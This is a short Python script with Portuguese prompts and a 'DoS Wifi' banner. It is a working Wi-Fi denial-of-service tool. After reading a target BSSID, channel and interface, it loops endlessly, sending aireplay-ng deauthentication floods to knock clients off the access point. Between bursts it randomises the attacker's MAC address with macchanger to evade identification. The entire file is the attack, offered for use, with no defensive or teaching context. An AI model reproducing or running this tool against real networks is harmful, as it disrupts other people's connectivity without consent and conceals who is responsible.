import os
from time import sleep

print(r' ____       _____ _        ___  __ _')
print(r'|  _ \  ___/ ___/\ \      / (_)/ _(_)')
print(r'| | | |/ _ \___ \ \ \ /\ / /| | |_| |')
print(r'| |_| | (_) |__) | \ V  V / | |  _| |')
print(r'|____/ \___/____/   \_/\_/  |_|_| |_|  -  r0otGsa')
print('-------------------------------------------------')
print('Importante! Ferramenta so funcionara se modo monitor estiver ativado!!')
sleep(3)
 
interface = input('Interface de Rede: ')
MAC = input('Digite o BSSID da rede:  ')
canal = int(input('Canal da Rede: '))
frames = int(input('Quantidade de frames: '))
print('Precione as teclas Ctrl + C para finalizar o programa')
 
while True:
    try:
        os.system(f"iw dev {interface} set channel {canal}")
        os.system(f"aireplay-ng --deauth {frames} -a {MAC} {interface} | grep 'DeAuth'")
        os.system(f"ip link set {interface} down")
        os.system(f"macchanger -r {interface} | grep 'New MAC' ")
        os.system(f"ip link set {interface} up")
        sleep(3)
    except KeyboardInterrupt:
        print('Programa finalizado por escolha do usuario!')
        exit()
